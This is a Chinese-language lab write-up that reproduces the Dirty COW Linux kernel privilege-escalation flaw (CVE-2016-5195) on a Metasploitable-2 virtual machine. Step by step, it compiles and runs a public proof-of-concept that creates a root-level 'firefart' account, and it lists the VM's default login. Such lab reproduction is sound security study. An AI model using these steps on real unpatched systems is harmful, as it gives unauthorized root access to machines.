# cve-2016-5195 dirty cow漏洞复现

## 1.漏洞描述

**漏洞编号**：CVE-2016-5195

**漏洞名称**：Dirty COW

**漏洞危害**：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权

**影响范围**：Linux内核>=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

​         360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响

## 2.实验环境

Metasploitable-2Linux下载地址：https://sourceforge.net/projects/metasploitable/

虚拟机用户名：msfadmin	密码：msfadmin

poc地址：https://github.com/FireFart/dirtycow

## 3.漏洞复现

### 3.1 将poc上传到虚拟机上

![image-20211125164613599](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125164613599.png)

### 3.2 查看系统信息

显示当前用户信息

```bash
id
```

使用`uname -a`命令查看linux内核信息，发现在脏牛漏洞范围内，可以进行测试。

```bash
uname -a
```

![image-20211125164647825](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125164647825.png)

### 3.3 进行提权

对dirty.c进行编译，生成一个dirty的可执行文件

```bash
cd dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
```

![image-20211125164709962](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125164709962.png)

执行`./dirty 111111("111111"是密码)命令，即可进行提权

```bash
./dirty 111111
```

![image-20211125165058249](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125165058249.png)

使用新密码登录firefart

```bash
su firefart
输入密码：111111
id
```

![image-20211125165423312](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125165423312.png)

成功提权。























